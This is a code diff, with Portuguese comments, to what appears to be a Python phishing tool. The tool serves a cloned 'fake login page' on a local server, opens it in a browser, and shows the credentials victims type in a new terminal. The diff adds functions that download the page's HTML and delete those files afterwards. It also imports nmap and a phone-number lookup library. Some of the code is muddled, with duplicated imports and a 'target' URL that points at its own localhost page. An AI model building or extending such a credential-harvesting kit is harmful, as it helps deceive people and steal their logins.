@@ -1,6 +1,9 @@
 import os
-import subprocess
+import shutil
 import requests
+import http.server
+import socketserver
+import webbrowser
 import time
 import threading
 import http.server
@@ -8,6 +11,7 @@ import socketserver
 import webbrowser
 import numlookupapi
 import nmap
+import subprocess
 from colorama import init, Fore, Style
 
 # Porta para o servidor HTTP local
@@ -256,6 +260,9 @@ def start_local_server(language):
         target_url = f"http://localhost:{PORT}/fake_login_page.html"
 
         try:
+            # Baixando HTML e CSS da página alvo
+            download_html_css(target_url)
+
             # Abrindo a página clonada no navegador padrão
             print("Opening fake login page in browser...")
             time.sleep(2)
@@ -270,6 +277,27 @@ def start_local_server(language):
 
     # Parando o servidor após o uso
     httpd.shutdown()
+
+    # Excluindo arquivos HTML e CSS
+    delete_html_css()
+
+def download_html_css(target_url):
+    # Criando diretório se não existir
+    if not os.path.exists(HTML_CSS_DIR):
+        os.makedirs(HTML_CSS_DIR)
+
+    # Obtendo conteúdo HTML e salvando no arquivo
+    response = requests.get(target_url)
+    if response.status_code == 200:
+        with open(os.path.join(HTML_CSS_DIR, 'fake_login_page.html'), 'wb') as f:
+            f.write(response.content)
+
+    # Opcional: Se houver CSS externo, baixe e salve no diretório HTML_CSS_DIR
+
+def delete_html_css():
+    # Excluindo diretório HTML_CSS_DIR e seu conteúdo
+    if os.path.exists(HTML_CSS_DIR):
+        shutil.rmtree(HTML_CSS_DIR)
 
 # Função para exibir as credenciais digitadas em um novo terminal
 def open_new_terminal(language):
